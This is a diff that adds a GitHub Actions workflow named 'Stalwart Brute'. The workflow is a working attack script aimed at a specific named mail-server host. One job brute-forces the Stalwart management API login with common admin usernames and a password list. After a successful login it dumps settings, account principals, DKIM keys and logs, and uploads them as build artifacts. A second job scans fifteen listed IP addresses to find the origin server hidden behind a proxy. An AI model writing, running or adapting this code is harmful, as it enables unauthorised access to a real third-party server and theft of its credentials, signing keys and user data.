@@ -1,0 +1,73 @@
+name: Stalwart Brute
+"on":
+  workflow_dispatch:
+
+jobs:
+  stalwart-auth:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Stalwart Auth Brute Force
+        run: |
+          echo "Runner IP: $(curl -s ifconfig.me)"
+          echo "=== Stalwart Management API Brute Force ==="
+          
+          # First check if we can reach it
+          curl -sk --connect-timeout 10 "https://monitor.hyonix.net/api/account/auth" -u "admin:test" 2>&1
+          
+          # Try Basic Auth brute force
+          for user in admin root administrator mail postmaster; do
+            while IFS= read -r pass; do
+              [ -z "$pass" ] && continue
+              result=$(curl -sk --connect-timeout 5 -X POST "https://monitor.hyonix.net/api/account/auth" \
+                -u "$user:$pass" 2>&1)
+              if echo "$result" | grep -qv "401\|Unauthorized"; then
+                echo "*** STALWART AUTH: $user:$pass ***"
+                echo "$result" > /tmp/stalwart_found.txt
+                
+                # Extract data
+                TOKEN=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('token','') or d.get('access_token',''))" 2>/dev/null)
+                
+                # Dump all settings
+                curl -sk "https://monitor.hyonix.net/api/settings" -H "Authorization: Bearer $TOKEN" > /tmp/stalwart_settings.txt 2>&1
+                curl -sk "https://monitor.hyonix.net/api/principal" -H "Authorization: Bearer $TOKEN" > /tmp/stalwart_principals.txt 2>&1
+                curl -sk "https://monitor.hyonix.net/api/dkim" -H "Authorization: Bearer $TOKEN" > /tmp/stalwart_dkim.txt 2>&1
+                curl -sk "https://monitor.hyonix.net/api/account/auth" -H "Authorization: Bearer $TOKEN" > /tmp/stalwart_account.txt 2>&1
+                curl -sk "https://monitor.hyonix.net/api/logs" -H "Authorization: Bearer $TOKEN" > /tmp/stalwart_logs.txt 2>&1
+                
+                break 2
+              fi
+            done < passwords.txt
+          done
+          
+          [ -f /tmp/stalwart_found.txt ] && echo "=== FOUND ===" && cat /tmp/stalwart_found.txt || echo "No access found"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: stalwart-results
+          path: /tmp/stalwart_*.txt
+          if-no-files-found: ignore
+
+  discover-stalwart-origin:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Find Stalwart Origin IP
+        run: |
+          echo "Runner IP: $(curl -s ifconfig.me)"
+          echo "=== Scanning for Stalwart origin ==="
+          
+          # Try all known IPs with Host header
+          for ip in "5.78.127.58" "167.235.220.62" "5.78.153.212" "89.58.3.202" \
+            "49.12.41.9" "5.161.54.155" "78.47.153.158" "162.55.177.241" \
+            "5.161.125.229" "45.87.61.101" "207.148.18.120" "185.3.93.228" \
+            "195.201.19.250" "140.82.3.49" "5.161.71.173"; do
+            result=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}:%{size_download}" \
+              "https://$ip/" -H "Host: monitor.hyonix.net" 2>&1)
+            code=$(echo "$result" | cut -d: -f1)
+            size=$(echo "$result" | cut -d: -f2)
+            if [ "$code" != "000" ] && [ "$code" != "530" ] && [ "$code" != "502" ] && [ "$code" != "403" ]; then
+              echo "  $ip -> $code (${size}b)"
+              # Check for Stalwart signature
+              body=$(curl -sk --connect-timeout 5 "https://$ip/" -H "Host: monitor.hyonix.net" 2>&1 | head -5)
+              echo "  Body: $(echo $body | head -c 200)"
+            fi
+          done
